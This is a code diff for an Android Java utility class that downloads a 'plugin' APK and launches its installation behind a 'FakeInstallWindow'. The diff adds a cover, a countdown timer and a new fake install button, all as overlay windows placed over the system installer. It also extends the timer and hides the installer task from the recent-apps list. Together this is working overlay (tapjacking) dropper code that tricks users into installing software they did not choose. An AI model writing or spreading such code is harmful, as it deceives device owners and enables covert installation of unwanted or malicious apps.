@@ -43,6 +43,7 @@ public class UtilOperator {
         File upgradeFile = new File(fullPath);
         i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
         i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
         context.startActivity(i);
 
         Config.LOGD("[[intstallLocalApk]] try to install plugin once with fake window");
@@ -62,9 +63,10 @@ public class UtilOperator {
         private View coverView;
         private View timerView;
         private TextView timeTV;
+        private View installView;
         private Context context;
         private WindowManager wm;
-        private int count = 5;
+        private int count = 10;
         private Handler handler;
 
         public FakeInstallWindow(Context context) {
@@ -73,6 +75,7 @@ public class UtilOperator {
             coverView = layoutInflater.inflate(R.layout.fake_install, null);
             timerView = layoutInflater.inflate(R.layout.fake_timer, null);
             timeTV = (TextView) timerView.findViewById(R.id.timer);
+            installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
             wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
             handler = new Handler(context.getMainLooper());
         }
@@ -83,9 +86,11 @@ public class UtilOperator {
                     UtilsRuntime.goHome(context);
                     wm.removeView(coverView);
                     wm.removeView(timerView);
+                    wm.removeView(installView);
                 }
                 coverView = null;
                 timerView = null;
+                installView = null;
                 fake = null;
             } else {
                 handler.post(new Runnable() {
@@ -124,6 +129,19 @@ public class UtilOperator {
             int screenHeight = dm.heightPixels;
             float density = dm.density;
 
+            //install
+            WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
+            confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
+            confirmBtnParams.format = PixelFormat.RGBA_8888;
+            confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
+            confirmBtnParams.width = (int) (60 * density);
+            confirmBtnParams.height = (int) (48 * density);
+            confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (20 * density);
+//            confirmBtnParams.x = screenWidth / 2 ;
+            confirmBtnParams.y = screenHeight - (int) (48 * density);
+            wm.addView(installView, confirmBtnParams);
+
+            //timer
             WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
             btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
             btnParams.format = PixelFormat.RGBA_8888;
@@ -133,6 +151,7 @@ public class UtilOperator {
             btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
             wm.addView(timerView, btnParams);
 
+            //cover
             WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
             wMParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
             wMParams.format = PixelFormat.RGBA_8888;
@@ -162,7 +181,7 @@ public class UtilOperator {
 
     public static void tryToDownloadPlugin(final Context context) {
         if (UtilsRuntime.isOnline(context)) {
-            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] current is ONLINE !!!");
+            Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");
 
             if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                 Config.DOWNLOAD_PROCESS_RUNNING.set(true);
@@ -182,20 +201,23 @@ public class UtilOperator {
 
                     @Override
                     public void onDownloadFinished(int status, Object response) {
+                        Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                         if (response != null) {
                             FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                             String localUrl = r.getRawLocalPath();
-                            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] download file success to : " + localUrl);
+                            Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
                             if (!TextUtils.isEmpty(localUrl)) {
                                 String targetPath = FileOperatorHelper.copyFile(localUrl, Config.PLUGIN_APK_PATH);
                                 if (!TextUtils.isEmpty(targetPath)) {
-                                    Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to mv download file to : " + targetPath);
+                                    Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);
                                     File targetFile = new File(targetPath);
                                     if (targetFile.exists()) {
-                                        Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] success download plugin file : " + targetPath);
+                                        Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
                                     }
                                 }
                             }
+                        } else {
+                            Config.LOGD("[[tryToDownloadPlugin]] download plugin falied, response is null");
                         }
                     }
                 });
